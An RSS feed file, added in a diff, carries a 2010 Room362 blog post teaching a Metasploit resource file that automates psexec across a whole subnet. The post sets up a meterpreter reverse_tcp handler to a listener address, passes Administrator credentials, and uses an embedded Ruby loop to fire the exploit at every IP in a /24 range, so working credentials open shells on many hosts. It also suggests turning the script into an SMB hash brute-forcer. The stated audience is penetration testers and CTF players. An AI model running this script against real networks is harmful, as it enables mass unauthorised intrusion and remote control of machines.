@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Resource Files on Room362</title>
+    <link>http://room362.com/categories/resource-files/</link>
+    <description>Recent content in Resource Files on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Sun, 12 Sep 2010 15:06:39 +0000</lastBuildDate>
+    <atom:link href="http://room362.com/categories/resource-files/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Rapid fire PSEXEC for Metasploit</title>
+      <link>http://room362.com/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</link>
+      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</guid>
+      <description>&lt;p&gt;Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.&lt;/p&gt;
+
+&lt;p&gt;// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections. Also take note of the &amp;ldquo;setg&amp;rdquo; which sets the variable globally so that I don&amp;rsquo;t have to set it inside of the psexec module.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;use multi/handler  
+setg PAYLOAD windows/meterpreter/reverse_tcp  
+setg LHOST 192.168.1.114  
+setg LPORT 80  
+set ExitOnSession false
+
+exploit -j -z
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn&amp;rsquo;t have to set up and tear down the handler. = fast. The following though is just the setup for the module.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;use windows/smb/psexec  
+set SMBUser Administrator  
+set SMBPass password123
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren&amp;rsquo;t joined to a domain they can take pretty much anything here.&lt;/p&gt;
+
+&lt;p&gt;However if they are actually joined to a domain, you either have to have the computer name (which definitely won&amp;rsquo;t play well with a scanner easily) or use domain credentials.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;set SMBDomain .
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The &amp;ldquo;.&amp;rdquo; is something every Windows API programmer would know as it&amp;rsquo;s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won&amp;rsquo;t take either localhost or 127.0.0.1.&lt;/p&gt;
+
+&lt;p&gt;Next up, we don&amp;rsquo;t want each run of the exploit module to build the multi/handler and tear it down every single run. That&amp;rsquo;s why we built it first and set DisablePayloadHandler inside of the psexec module.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;set DisablePayloadHandler true
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the &lt;code&gt;&amp;lt;ruby&amp;gt;&lt;/code&gt; html like block identifier you can then use the power of Ruby combined with Rex (Metasploit&amp;rsquo;s API) to do really cool stuff.&lt;/p&gt;
+
+&lt;p&gt;More setup, but this time for the ruby portion. Using Metasploit&amp;rsquo;s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the &amp;ldquo;file:&amp;rdquo; prefix.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;&amp;lt;ruby&amp;gt;  
+require &#39;rex/socket/range_walker&#39;  
+rhosts = &amp;quot;192.168.92.0/24&amp;quot;  
+iplist = Rex::Socket::RangeWalker.new(rhosts)  
+iplist.each do |rhost|
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, we&amp;rsquo;ve included RangeWalker, parsed it, and loaded it into an &amp;lsquo;each&amp;rsquo; for loop.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code&gt;self.run_single&lt;/code&gt; function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;	self.run_single(&amp;quot;set RHOST #{rhost}&amp;quot;)  
+	self.run_single(&amp;quot;exploit -j -z&amp;quot;)
+end  
+&amp;lt;/ruby&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That&amp;rsquo;s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the &amp;ldquo;-z -j&amp;rdquo; just as we did with multi/handler.&lt;/p&gt;
+
+&lt;p&gt;Now, if your credentials worked on any of the IPs you&amp;rsquo;ll have sessions waiting for you.&lt;/p&gt;
+
+&lt;p&gt;This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.&lt;/p&gt;
+
+&lt;p&gt;Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
